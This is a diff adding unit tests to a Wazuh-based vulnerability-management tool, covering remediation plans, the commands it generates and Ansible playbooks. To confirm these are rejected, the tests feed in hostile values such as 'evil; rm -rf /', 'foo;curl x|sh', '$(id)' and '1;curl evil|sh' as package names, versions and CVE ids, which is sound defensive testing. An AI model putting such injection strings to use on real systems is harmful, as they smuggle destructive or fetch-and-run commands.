@@ -3,12 +3,13 @@
 import datetime as dt
 import json
 import os
+import subprocess
 import tempfile
 import threading
 import unittest
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-from vulnmgmt import ai, demo, intel, prioritize, publish, wazuh
+from vulnmgmt import ai, demo, intel, prioritize, publish, remediation, wazuh
 
 
 class FakeServer:
@@ -129,7 +130,8 @@ class PublishTests(unittest.TestCase):
             report = {"generated_at": "2026-01-01T00:00:00", "kpis": kpis, "actionables": acts,
                       "hosts": hosts, "ai": {"source": "reglas", "notes": {}}}
             publish.write_outputs(cfg, report, state)
-            for name in ("latest.json", "history.json", "actionables.csv", "reports/2026-01-01.json"):
+            for name in ("latest.json", "history.json", "actionables.csv", "remediation.yml",
+                         "reports/2026-01-01.json"):
                 self.assertTrue(os.path.exists(os.path.join(cfg["web_data_dir"], name)), name)
             sent = publish.siem_events(cfg, report, previous_ids=set())
             self.assertEqual(sent, 1 + kpis["actions"]["P1"] + kpis["actions"]["P2"])
@@ -140,6 +142,125 @@ class PublishTests(unittest.TestCase):
             with open(cfg["wazuh_events_log"], encoding="utf-8") as fh:
                 first = json.loads(fh.readline())
             self.assertEqual(first["vulnmgmt"]["event"], "summary")
+
+
+def action(pkg, prio="P1", kind="actualizar", ptype="rpm", hosts=(("001", "srv-a"),), ident=None):
+    return {"id": ident or "VM-" + pkg, "priority": prio, "action": kind, "package": pkg, "package_type": ptype,
+            "hosts": [{"id": i, "name": n, "os": "Rocky Linux 9.6"} for i, n in hosts]}
+
+
+class RemediationTests(unittest.TestCase):
+    def test_only_safe_updates_are_automated(self):
+        plan = remediation.build([
+            action("openssl"),                                                  # automated
+            action("less", kind="mitigar"),                                     # no patch
+            action("foo", kind="revisar"),                                      # unknown condition
+            action("Chrome", ptype="win"),                                      # unsupported manager
+            action("wazuh-agent", prio="P2"),                                   # protected component
+            action("wazuh-manager"),
+            action("evil; rm -rf /"),                                           # unsafe package name
+            action("curl", hosts=(("002", "bad host;name"),)),                  # unsafe host name
+        ])
+        self.assertEqual([h["name"] for h in plan["hosts"]], ["srv-a"])
+        self.assertEqual(plan["hosts"][0]["packages"]["P1"], ["openssl"])
+        manual = {m["package"]: m["reason"] for m in plan["manual"]}
+        self.assertEqual(set(manual), {"less", "foo", "Chrome", "wazuh-agent", "wazuh-manager",
+                                       "evil; rm -rf /", "curl"})
+        self.assertIn("Wazuh", manual["wazuh-agent"])
+        self.assertIn("no válido", manual["curl"])
+
+    def test_commands_per_scope_and_package_manager(self):
+        plan = remediation.build([action("b", "P1"), action("a", "P1"), action("c", "P2"), action("d", "P4"),
+                                  action("libssl3", "P1", ptype="deb", hosts=(("003", "srv-deb"),))])
+        rpm = next(h for h in plan["hosts"] if h["name"] == "srv-a")
+        self.assertEqual(rpm["commands"], {
+            "P1": "sudo dnf upgrade -y --disablerepo='wazuh*' a b",
+            "hasta-P2": "sudo dnf upgrade -y --disablerepo='wazuh*' a b c",
+            "todas": "sudo dnf upgrade -y --disablerepo='wazuh*' a b c d"})
+        self.assertEqual(rpm["total"], 4)
+        deb = next(h for h in plan["hosts"] if h["name"] == "srv-deb")
+        self.assertEqual(deb["commands"],
+                         {"P1": "sudo apt-get update && sudo apt-get install --only-upgrade -y libssl3"})
+        only_p1 = remediation.build([action("a", "P1")])["hosts"][0]["commands"]
+        self.assertEqual(list(only_p1), ["P1"])                                 # no duplicated scopes
+
+    def test_wazuh_server_is_marked_local_and_hosts_are_ordered_by_priority(self):
+        plan = remediation.build([action("a", "P3", hosts=(("001", "b-low"),)),
+                                  action("b", "P1", hosts=(("000", "wazuh-server"),))])
+        self.assertEqual([h["name"] for h in plan["hosts"]], ["wazuh-server", "b-low"])
+        self.assertTrue(plan["hosts"][0]["local"])
+        self.assertFalse(plan["hosts"][1]["local"])
+
+    def test_playbook_never_reboots_nor_touches_wazuh_and_is_valid_yaml(self):
+        plan = remediation.build([action("openssl", "P1"), action("curl", "P2"),
+                                  action("libssl3", "P1", ptype="deb", hosts=(("003", "srv-deb"),)),
+                                  action("wazuh-agent", "P1")])
+        text = remediation.playbook(plan, "2026-01-01T00:00:00+0000", "wazuh")
+        self.assertNotIn("reboot:", text)                                       # no ansible.builtin.reboot
+        self.assertNotIn("wazuh-agent", text.split("\n- name:", 1)[1])         # excluded from every play
+        self.assertIn('disablerepo: ["wazuh*"]', text)
+        self.assertIn("tags: [P1]", text)
+        self.assertNotIn("DEMOSTRACIÓN", text)
+        self.assertIn("DEMOSTRACIÓN", remediation.playbook(plan, "x", "demo"))
+        try:
+            import yaml
+        except ImportError:
+            return
+        plays = yaml.safe_load(text)
+        self.assertEqual([p["hosts"] for p in plays], ["srv-a", "srv-deb"])
+        self.assertTrue(all(p["become"] is True for p in plays))
+        modules = {k for p in plays for t in p["tasks"] for k in t if k.startswith("ansible.builtin.")}
+        self.assertEqual(modules, {"ansible.builtin.dnf", "ansible.builtin.apt", "ansible.builtin.command",
+                                   "ansible.builtin.stat", "ansible.builtin.debug"})
+
+    def test_empty_plan_yields_a_harmless_playbook(self):
+        text = remediation.playbook(remediation.build([]), "x", "wazuh")
+        try:
+            import yaml
+        except ImportError:
+            self.assertIn("hosts: localhost", text)
+            return
+        plays = yaml.safe_load(text)
+        self.assertEqual(len(plays), 1)
+        self.assertEqual(plays[0]["hosts"], "localhost")
+
+    def test_untrusted_values_never_reach_a_command(self):
+        for pkg in ("foo;curl x|sh", "$(id)", "a b", "`id`", "../x", "-rf"):
+            for ptype in ("rpm", "deb", "pypi", "npm"):
+                cmds = prioritize.commands_for(pkg, ptype, "1.0")
+                self.assertNotIn(pkg, cmds["remediation"])
+                self.assertIn("no se genera", cmds["remediation"])
+        # a hostile "fixed version" is dropped instead of being pasted into pip / npm commands
+        self.assertEqual(prioritize.commands_for("pkg", "pypi", "1.0';id;'")["remediation"], "pip install --upgrade 'pkg'")
+        self.assertEqual(prioritize.commands_for("pkg", "npm", "1;curl evil|sh")["remediation"], "npm install pkg@latest")
+        self.assertEqual(prioritize.commands_for("pkg", "pypi", "1.2.3")["remediation"], "pip install --upgrade 'pkg>=1.2.3'")
+        # the CVE id used by the "mitigar" verification command must look like a CVE
+        no_fix = "Package default status"                        # -> action "mitigar"
+        acts, _, _ = prioritize.analyse([finding(cve="CVE-2024-1; id", pkg="less", cond=no_fix)], {}, {}, {}, None, {})
+        self.assertEqual(acts[0]["action"], "mitigar")
+        self.assertNotIn("CVE-2024-1; id", acts[0]["commands"]["verification"])
+        ok, _, _ = prioritize.analyse([finding(cve="CVE-2024-0001", pkg="less", cond=no_fix)], {}, {}, {}, None, {})
+        self.assertEqual(ok[0]["commands"]["verification"], "dnf updateinfo list --cve CVE-2024-0001")
+
+    def test_ansible_commands_are_real_and_tokenise_as_intended_in_bash(self):
+        plan = remediation.build([action("a", "P2", hosts=(("001", "srv-web"), ("000", "wazuh-server")))])
+        by_name = {h["name"]: h for h in plan["hosts"]}
+        for name, expected_head in (("srv-web", ["-i", "inventory/hosts.ini", "remediation.yml", "--limit", "srv-web"]),
+                                    ("wazuh-server", ["-i", "wazuh-server,", "-c", "local", "remediation.yml"])):
+            for mode, tail in (("simular", ["--tags", "P2", "-K", "--check", "--diff"]), ("aplicar", ["--tags", "P2", "-K"])):
+                cmd = by_name[name]["ansible"][mode]
+                self.assertNotIn("<", cmd)                      # "<servidor>" would be a shell redirect
+                self.assertNotIn(">", cmd)
+                out = subprocess.run(["bash", "-c", "ansible-playbook() { printf '%s\\n' \"$@\"; }; " + cmd],
+                                     capture_output=True, text=True, check=True).stdout.split("\n")[:-1]
+                self.assertEqual(out[:len(expected_head)], expected_head)
+                self.assertEqual(out[-len(tail):], tail)
+        self.assertEqual(remediation.ansible_commands("x", False, "P1")["aplicar"],
+                         "ansible-playbook -i inventory/hosts.ini remediation.yml --limit x --tags P1 -K")
+
+    def test_protected_package_gets_manual_guidance_instead_of_a_command(self):
+        self.assertIn("Wazuh", prioritize.commands_for("wazuh-agent", "rpm", "4.9.0")["remediation"])
+        self.assertEqual(prioritize.commands_for("openssl", "rpm", "3.0")["remediation"], "sudo dnf upgrade -y openssl")
 
 
 class AITests(unittest.TestCase):
